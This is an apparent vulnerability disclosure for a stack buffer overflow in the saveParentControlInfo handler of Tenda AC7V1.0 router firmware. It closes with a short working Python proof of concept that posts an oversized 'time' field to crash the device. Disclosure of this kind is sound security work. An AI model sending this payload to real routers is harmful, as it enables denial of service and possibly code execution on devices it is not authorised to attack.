## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2776.html

## Affected version

 AC7V1.0 V15.03.06.44

## Vulnerability details

The function `saveParentControlInfo` contains a stack-based buffer overflow vulnerability.

![image-20240318163801267](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318163801267.png)

it reads in a user-provided parameter `time`, and the variable is passed to the function without any length check, which may lead to overflow of the stack-based buffer.

![image-20240318163658287](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318163658287.png)

As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution with carefully crafted overflow data.

![image-20240318163824504](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318163824504.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/saveParentControlInfo"
payload = b"a"*1000

data = {"time": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240318163718100](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318163718100.png)
